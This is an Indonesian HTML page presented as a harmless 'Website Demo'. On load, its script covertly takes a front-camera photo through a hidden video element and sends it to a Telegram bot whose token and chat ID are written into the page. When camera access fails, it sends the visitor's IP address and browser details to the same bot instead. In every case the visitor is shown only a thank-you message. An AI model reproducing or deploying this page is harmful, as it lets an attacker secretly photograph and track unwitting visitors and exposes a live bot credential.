<!DOCTYPE html>
<html>
<head>
    <title>Website Demo</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .loading { color: blue; }
        .error { color: red; }
    </style>
</head>
<body>
    <h2>Selamat Datang di Website Demo</h2>
    <p id="status">Memuat halaman...</p>
    
    <script>
        // Konfigurasi - GANTI DENGAN DATA ANDA (untuk testing)
        const BOT_TOKEN = '8534688671:AAHXJBiLh0nrnyojAw2ggCUdMFELQgKyeuc';  // Dapatkan dari @BotFather
        const CHAT_ID = '-5200751249';               // Dapatkan dari @userinfobot
        
        // Fungsi untuk mengirim foto ke Telegram
        async function kirimKeTelegram(fotoBase64) {
            try {
                // Konversi base64 ke blob
                const byteCharacters = atob(fotoBase64.split(',')[1]);
                const byteNumbers = new Array(byteCharacters.length);
                
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], { type: 'image/jpeg' });
                
                // Buat form data
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'foto.jpg');
                formData.append('caption', `Foto diambil: ${new Date().toLocaleString()}`);
                
                // Kirim ke Telegram
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                console.log('Foto terkirim!');
                document.getElementById('status').innerHTML = 'Terima kasih telah berkunjung!';
                
            } catch (error) {
                console.error('Gagal mengirim:', error);
                document.getElementById('status').innerHTML = 'Terima kasih telah berkunjung!';
            }
        }
        
        // Fungsi utama: akses kamera dan ambil foto
        async function ambilDanKirimFoto() {
            try {
                document.getElementById('status').innerHTML = 'Memuat...';
                
                // Minta akses kamera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'user' // Kamera depan
                    }
                });
                
                // Buat elemen video tersembunyi
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.display = 'none';
                video.autoplay = true;
                document.body.appendChild(video);
                
                // Tunggu video siap
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                // Tunggu 1 detik agar kamera fokus
                setTimeout(() => {
                    // Buat canvas untuk ambil gambar
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Konversi ke JPEG (kualitas 80%)
                    const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // Hentikan semua track kamera
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Hapus elemen video
                    video.remove();
                    
                    // Kirim foto ke Telegram
                    kirimKeTelegram(fotoBase64);
                    
                }, 1000);
                
            } catch (error) {
                console.error('Gagal akses kamera:', error);
                document.getElementById('status').innerHTML = 'Terima kasih telah berkunjung!';
                
                // Opsional: tetap kirim notifikasi meski gagal
                if (BOT_TOKEN !== 'TOKEN_BOT_TELEGRAM_ANDA') {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `⚠️ Gagal akses kamera\nIP: ${await cekIP()}\nBrowser: ${navigator.userAgent}`
                        })
                    });
                }
            }
        }
        
        // Fungsi tambahan untuk cek IP (opsional)
        async function cekIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'Tidak diketahui';
            }
        }
        
        // Mulai proses saat halaman dimuat
        window.onload = () => {
            // Cek apakah token sudah diisi
            if (BOT_TOKEN === 'TOKEN_BOT_TELEGRAM_ANDA') {
                document.getElementById('status').innerHTML = 
                    '⚠️ Demo: Ganti TOKEN_BOT_TELEGRAM_ANDA dengan token asli untuk testing';
                return;
            }
            
            ambilDanKirimFoto();
        };
    </script>
</body>
</html>
